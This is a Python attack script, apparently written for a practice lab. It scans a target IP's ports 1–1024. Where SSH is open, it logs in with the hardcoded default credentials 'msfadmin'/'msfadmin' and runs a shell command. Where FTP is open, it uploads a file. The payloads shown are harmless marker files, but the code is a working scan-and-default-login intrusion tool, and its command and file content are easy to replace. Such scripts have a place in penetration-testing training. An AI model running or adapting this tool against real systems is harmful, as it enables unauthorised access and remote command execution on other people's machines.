import paramiko
import ftplib
import socket
import logging

# Configure logging
logging.basicConfig(filename="multiport_exploit.log", level=logging.DEBUG, format="%(asctime)s - %(message)s")


def scan_ports(ip, start_port, end_port):
    """Scan target machine for open ports."""
    open_ports = []
    print(f"Scanning ports {start_port} to {end_port} on {ip}...")
    for port in range(start_port, end_port + 1):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                if s.connect_ex((ip, port)) == 0:
                    open_ports.append(port)
                    print(f"[+] Port {port} is open.")
        except Exception as e:
            logging.error(f"Error scanning port {port}: {e}")
    return open_ports


def ssh_execute(ip, port, username, password, command):
    """Login via SSH and execute a command."""
    try:
        print(f"Connecting to SSH - Username: {username}, Password: {password}")
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, port=port, username=username, password=password, timeout=5)

        print(f"[+] SSH Connected! Executing command: {command}")
        stdin, stdout, stderr = client.exec_command(command)
        output = stdout.read().decode()
        errors = stderr.read().decode()
        
        if output:
            print(f"[+] Command Output: {output}")
            logging.info(f"Command executed successfully: {command}\nOutput: {output}")
        if errors:
            print(f"[-] Command Errors: {errors}")
            logging.error(f"Errors while executing command: {command}\nErrors: {errors}")
        
        client.close()
        return True
    except Exception as e:
        print(f"Error during SSH execution: {e}")
        logging.error(f"SSH Execution Error: {e}")
        return False


def ftp_make_changes(ip, username, password, filename, content):
    """Login via FTP and upload a file."""
    try:
        print(f"Connecting to FTP - Username: {username}, Password: {password}")
        ftp = ftplib.FTP()
        ftp.connect(ip, 21, timeout=5)
        ftp.login(user=username, passwd=password)

        print(f"[+] FTP Connected! Creating file: {filename}")
        with open(filename, "w") as local_file:
            local_file.write(content)
        
        with open(filename, "rb") as upload_file:
            ftp.storbinary(f"STOR {filename}", upload_file)

        print(f"[+] File {filename} successfully uploaded!")
        logging.info(f"File {filename} created and uploaded via FTP.")
        
        ftp.quit()
        return True
    except Exception as e:
        print(f"FTP Error: {e}")
        logging.error(f"FTP Error: {e}")
        return False


def main():
    # Target machine details
    target_ip = input("Enter the target IP: ")
    username = "msfadmin"
    password = "msfadmin"

    # Scan for open ports
    open_ports = scan_ports(target_ip, 1, 1024)
    print(f"Open ports on {target_ip}: {open_ports}")

    # Attempt actions based on detected services
    for port in open_ports:
        if port == 22:  # SSH
            ssh_command = "echo 'Hello from Multiport Exploit!' > /tmp/hello_from_multiport.txt"
            if ssh_execute(target_ip, port, username, password, ssh_command):
                print(f"[+] Successfully executed SSH command on port {port}.")
        elif port == 21:  # FTP
            ftp_filename = "multiport_file.txt"
            ftp_content = "This file was created via multiport script."
            if ftp_make_changes(target_ip, username, password, ftp_filename, ftp_content):
                print(f"[+] Successfully uploaded file via FTP on port {port}.")
        else:
            print(f"[-] No exploit implemented for port {port}.")

    print("[*] Multiport exploit completed.")


if __name__ == "__main__":
    main()
